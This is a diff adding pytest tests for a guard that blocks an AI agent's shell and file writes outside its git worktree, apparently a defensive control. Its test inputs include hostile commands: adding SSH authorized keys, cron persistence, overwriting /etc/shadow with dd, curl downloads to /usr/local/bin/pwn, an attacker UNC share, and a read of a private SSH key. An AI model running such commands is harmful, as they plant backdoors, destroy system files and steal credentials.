@@ -375,3 +375,101 @@ def test_ordinary_redirects_are_still_allowed(shared, command):
 def test_git_danger(shared, command, blocked):
     assert bool(shared.git_danger_reason(command)) is blocked
     assert bool(shared.check_git_danger("Bash", {"command": command})) is blocked
+
+
+# ── worktree write containment (exa-bench-07) ─────────────────────────────
+#
+# The unit-level half. The end-to-end half — both guard paths refusing the same
+# writes — lives in tests/test_skip_permissions_compensating_controls.py, which
+# is where the decision doc's coverage matrix is measured.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        # Verbs that write with no redirection operator, which is exactly why
+        # the tier extractor (redirect + tee only) never saw these at all.
+        ("touch /home/victim/.ssh/authorized_keys",
+         ["/home/victim/.ssh/authorized_keys"]),
+        ("mkdir -p /etc/cron.d/persist", ["/etc/cron.d/persist"]),
+        ("sudo mkdir /etc/evil", ["/etc/evil"]),          # wrapper stripped
+        ("ICDEV_X=1 touch /etc/evil", ["/etc/evil"]),     # env assignment stripped
+        ("cp payload.sh /usr/local/bin/pwn", ["/usr/local/bin/pwn"]),  # dest is last
+        ("mv a.txt b.txt", ["b.txt"]),
+        ("dd if=/dev/zero of=/etc/shadow", ["/etc/shadow"]),
+        ("curl https://x/y -o /usr/local/bin/pwn", ["/usr/local/bin/pwn"]),
+        ("wget https://x/y -O /tmp/z", ["/tmp/z"]),
+        # A read is not a write, and a source is not a destination.
+        ("cat /etc/passwd", []),
+        ("git status", []),
+    ],
+)
+def test_bash_write_targets(shared, command, expected):
+    assert shared.bash_write_targets(command) == expected
+
+
+def test_bash_write_targets_includes_the_redirect_forms(shared):
+    """Superset of bash_file_targets' write half, not a replacement for it."""
+    targets = shared.bash_write_targets("echo k >> ~/.ssh/authorized_keys")
+    assert "~/.ssh/authorized_keys" in targets
+
+
+@pytest.mark.parametrize(
+    "raw,outside",
+    [
+        ("/etc/cron.d/pwn", True),
+        ("~/.bashrc", True),
+        ("$HOME/.bashrc", True),                 # a shell would have expanded it
+        ("C:/Windows/System32/drivers/etc/hosts", True),  # true on POSIX too
+        (r"\attacker\share\payload", True),     # UNC — a host we cannot judge
+        ("C:notes.txt", True),                   # drive-RELATIVE — per-drive cwd
+        ("tools/foo.py", False),
+        (".tmp/scratch/report.json", False),
+        ("/dev/null", False),                    # not a file; a very common sink
+        ("2>&1", False),                         # never a path
+    ],
+)
+def test_outside_write_root(shared, raw, outside):
+    assert bool(shared.outside_write_root(raw, repo_root=REPO_ROOT)) is outside
+
+
+def test_the_boundary_check_is_writes_only(shared):
+    """Reads are exa-bench-09's territory. Refusing one here would look like
+    coverage of a gap this check does not close."""
+    assert shared.check_write_outside_worktree(
+        "Read", {"file_path": "/home/victim/.ssh/id_rsa"}, repo_root=REPO_ROOT
+    ) is None
+
+
+def test_the_boundary_check_is_disablable_and_has_a_monitor_mode(shared, monkeypatch):
+    call = ("Write", {"file_path": "/etc/cron.d/pwn", "content": "x"})
+    assert shared.check_write_outside_worktree(*call, repo_root=REPO_ROOT)
+
+    monkeypatch.setenv(shared.WRITE_BOUNDARY_GUARD_ENV, "0")
+    assert shared.check_write_outside_worktree(*call, repo_root=REPO_ROOT) is None
+
+    monkeypatch.setenv(shared.WRITE_BOUNDARY_GUARD_ENV, "monitor")
+    assert shared.check_write_outside_worktree(*call, repo_root=REPO_ROOT) is None
+
+
+def test_extra_roots_can_sanction_a_path(shared, monkeypatch, tmp_path):
+    """The operator escape hatch, so the answer to a false positive is a root
+    rather than turning the guard off."""
+    target = tmp_path / "elsewhere" / "out.json"
+    monkeypatch.setenv(shared.WRITE_BOUNDARY_EXTRA_ROOTS_ENV, str(tmp_path / "elsewhere"))
+    assert shared.outside_write_root(str(target), repo_root=REPO_ROOT) is None
+
+
+def test_the_main_checkout_is_sanctioned_from_a_linked_worktree(shared, tmp_path):
+    """A worktree's anchor is itself; the checkout it is linked to is the second
+    root. Read from `<anchor>/.git` — no `git rev-parse` on the per-call path."""
+    main = tmp_path / "repo"
+    (main / ".git" / "worktrees" / "wt").mkdir(parents=True)
+    worktree = tmp_path / "wt"
+    worktree.mkdir()
+    (worktree / ".git").write_text(
+        f"gitdir: {main / '.git' / 'worktrees' / 'wt'}\n", encoding="utf-8"
+    )
+    roots = shared.sanctioned_write_roots(worktree)
+    assert main.resolve() in roots
+    assert worktree.resolve() in roots
